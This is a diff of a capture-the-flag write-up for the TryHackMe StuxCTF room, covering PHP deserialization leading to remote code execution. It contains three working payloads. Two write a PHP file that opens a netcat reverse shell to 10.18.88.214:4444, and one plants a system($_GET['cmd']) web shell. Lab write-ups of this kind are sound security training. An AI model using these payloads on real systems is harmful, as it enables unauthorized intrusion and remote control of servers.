@@ -1,4 +1,4 @@
-# 28 - StuxCTF - PHP Deserialization
+# 28 - StuxCTF - PHP Deserialization, Diffie Hellman decryption
 
 Room Link --> [https://tryhackme.com/room/stuxctf](https://tryhackme.com/room/stuxctf)
 
@@ -151,15 +151,13 @@ And looking at the decoded "index.php" file we see the "unserialize" function:
 
 Google search `PHP unserialize exploit to RCE` , found many blog posts that explains this vulnerability so i used this [one](https://notsosecure.com/remote-code-execution-php-unserialize)
 
-{% code title="shell.php" overflow="wrap" lineNumbers="true" %}
-```php
-# 1st php payload.
-<?php
+<pre class="language-php" data-title="shell.php" data-overflow="wrap" data-line-numbers><code class="lang-php"># 1st php payload.
+&#x3C;?php
 class file 
 {
 	public $file = 'shell.php';
-	public $data = "<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 4444 >/tmp/f') ?>";
-}
+<strong>	public $data = "&#x3C;?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.18.88.214 4444 >/tmp/f') ?>";
+</strong>}
 
 $serial = serialize(new file);
 print $serial;
@@ -172,11 +170,11 @@ print("\n");
 # --------------------------------------------------------
 # 2nd php payload.
 # this saves the file into the "assets" directory.
-<?php
+&#x3C;?php
 class file 
 {
 	public $file = 'assets/shell.php';
-	public $data = "<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 4444 >/tmp/f') ?>";
+	public $data = "&#x3C;?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.18.88.214 4444 >/tmp/f') ?>";
 }
 
 $serial = serialize(new file);
@@ -194,10 +192,10 @@ echo serialize($obj);
 # --------------------------------------------------------
 # 3rd php payload.
 # for cmd execution (web shell code).
-<?php
+&#x3C;?php
 class file {
         public $file = "shell.php";
-        public $data = '<?php system($_GET["cmd"])?>';
+        public $data = '&#x3C;?php system($_GET["cmd"])?>';
         function __destruct(){
                 file_put_contents($this->file, $this->data);
         }
@@ -208,8 +206,7 @@ echo serialize($obj);
 ?>
 # php shell.php > webshell.txt # serialized data is stored in webshell.txt
 
-```
-{% endcode %}
+</code></pre>
 
 Then we setup python simple webserver.
 
